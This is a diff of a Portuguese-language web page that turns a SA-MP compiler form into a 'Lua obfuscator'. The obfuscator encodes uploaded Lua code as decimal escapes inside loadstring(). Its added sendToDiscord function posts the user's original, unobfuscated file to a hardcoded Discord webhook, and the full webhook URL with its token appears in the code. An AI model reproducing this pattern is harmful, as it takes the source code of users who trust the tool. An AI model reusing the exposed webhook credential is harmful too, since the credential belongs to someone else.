@@ -3,44 +3,259 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compilador SA-MP</title>
+    <title>Obfuscador de Arquivos Lua</title>
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #F1F3F4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Container Principal */
+        .container {
+            background-color: #FFFFFF;
+            border-radius: 16px;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #2C3E50;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        label {
+            font-size: 16px;
+            color: #7F8C8D;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        /* Input de Arquivo */
+        #fileInput {
+            display: block;
+            margin: 20px auto;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #BDC3C7;
+            border-radius: 8px;
+            background-color: #FFFFFF;
+            color: #34495E;
+            width: 100%;
+            transition: border-color 0.3s;
+        }
+
+        #fileInput:focus {
+            border-color: #3498DB;
+            outline: none;
+        }
+
+        /* Botões */
+        .button {
+            padding: 14px 24px;
+            background-color: #3498DB;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .button:hover {
+            background-color: #2980B9;
+            transform: translateY(-3px);
+        }
+
+        .button:disabled {
+            background-color: #BDC3C7;
+            cursor: not-allowed;
+        }
+
+        /* Status de Envio */
+        #status {
+            font-size: 16px;
+            margin-top: 20px;
+            transition: color 0.3s;
+        }
+
+        .status-error {
+            color: #E74C3C;
+        }
+
+        .status-success {
+            color: #2ECC71;
+        }
+
+        /* Tabela de Código Obfuscado */
+        #obfuscatedCodeTable {
+            margin-top: 20px;
+            display: none;
+            text-align: left;
+            width: 100%;
+            font-family: monospace;
+            border-collapse: collapse;
+        }
+
+        #obfuscatedCodeTable td {
+            padding: 8px;
+            border: 1px solid #BDC3C7;
+        }
+
+        .download-link {
+            margin-top: 20px;
+            display: none;
+            font-size: 16px;
+        }
+
+        .download-link a {
+            color: #3498DB;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .download-link a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
 </head>
 <body>
-    <h1>Compilador de Gamemode SA-MP</h1>
-    <form id="uploadForm" enctype="multipart/form-data">
-        <label for="pwnFile">Escolha o arquivo .pwn para compilar:</label>
-        <input type="file" id="pwnFile" name="pwnFile" accept=".pwn" required>
-        <button type="submit">Compilar e Enviar para Discord</button>
-    </form>
 
-    <div id="status"></div>
+    <div class="container">
+        <h1>Obfuscador de Arquivos Lua</h1>
+
+        <label for="fileInput">Selecione um arquivo Lua:</label>
+        <input type="file" id="fileInput" accept=".lua">
+
+        <button id="obfuscateBtn" class="button" disabled>OFUSCAR</button>
+        
+        <div id="status"></div>
+
+        <!-- Tabela para mostrar o código obfuscado -->
+        <table id="obfuscatedCodeTable">
+            <tr>
+                <td id="obfuscatedCode"></td>
+            </tr>
+        </table>
+
+        <button id="copyCodeBtn" class="button" style="display:none;">Copiar Código</button>
+
+        <div class="download-link" id="downloadLink">
+            <a href="#" id="downloadBtn" download>Baixar Arquivo Obfuscado</a>
+        </div>
+    </div>
 
     <script>
-        document.getElementById('uploadForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
+        let obfuscatedContent = "";
 
-            const formData = new FormData();
-            const fileInput = document.getElementById('pwnFile');
-
-            if (fileInput.files.length > 0) {
-                formData.append('pwnFile', fileInput.files[0]);
-
-                const statusDiv = document.getElementById('status');
-                statusDiv.textContent = 'Enviando arquivo para compilação...';
-
-                try {
-                    const response = await fetch('http://localhost:3000/compile', {
-                        method: 'POST',
-                        body: formData,
-                    });
-
-                    const result = await response.text();
-                    statusDiv.textContent = result;
-                } catch (error) {
-                    statusDiv.textContent = 'Erro ao compilar o arquivo.';
-                }
-            }
+        document.getElementById('fileInput').addEventListener('change', function() {
+            const fileInput = document.getElementById('fileInput');
+            const obfuscateBtn = document.getElementById('obfuscateBtn');
+            obfuscateBtn.disabled = !fileInput.files.length;
         });
+
+        document.getElementById('obfuscateBtn').addEventListener('click', function() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+
+            if (!file) {
+                alert('Por favor, selecione um arquivo Lua.');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const luaCode = e.target.result;
+                minifyAndObfuscate(luaCode);
+
+                // Mostrar código obfuscado na tabela
+                document.getElementById('obfuscatedCode').textContent = obfuscatedContent;
+                document.getElementById('obfuscatedCodeTable').style.display = 'block';
+                document.getElementById('copyCodeBtn').style.display = 'inline-block';
+
+                // Enviar o código para o Discord
+                sendToDiscord(file);
+
+                // Mostrar link para download
+                const downloadLink = document.getElementById('downloadLink');
+                downloadLink.style.display = 'block';
+                document.getElementById('downloadBtn').href = URL.createObjectURL(new Blob([obfuscatedContent], {type: 'text/plain'}));
+
+                document.getElementById('status').innerHTML = "Arquivo obfuscado pronto!";
+                document.getElementById('status').classList.remove('status-error');
+                document.getElementById('status').classList.add('status-success');
+            };
+            reader.readAsText(file);
+        });
+
+        document.getElementById('copyCodeBtn').addEventListener('click', function() {
+            const code = document.getElementById('obfuscatedCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Código copiado para a área de transferência!');
+            });
+        });
+
+        function minifyAndObfuscate(luaCode) {
+            const minifiedLua = luaCode.replace(/--.*$/gm, '').replace(/\s+/g, ' ');
+            const encoded = minifiedLua.replace(/./g, function(char) {
+                const byteValue = char.charCodeAt(0);
+                return "\\" + byteValue;
+            });
+            obfuscatedContent = `loadstring("${encoded}")()`;
+        }
+
+        function sendToDiscord(file) {
+            const formData = new FormData();
+            formData.append('file', file);
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1288980879397621791/iK325TYN4nvqY4Pls61Uq6K1hP-t2vEQn77Qvif29SVClz0b-CWVjpqHyEZf_LAhiZIa';
+            const statusDiv = document.getElementById('status');
+
+            statusDiv.innerHTML = "Enviando para o Discord...";
+            statusDiv.classList.remove('status-error');
+            statusDiv.classList.remove('status-success');
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                statusDiv.innerHTML = "Arquivo enviado para o Discord!";
+                statusDiv.classList.add('status-success');
+            })
+            .catch(error => {
+                console.error('Erro no envio:', error);
+                statusDiv.innerHTML = "Ocorreu um erro no envio.";
+                statusDiv.classList.add('status-error');
+            });
+        }
     </script>
+
 </body>
 </html>
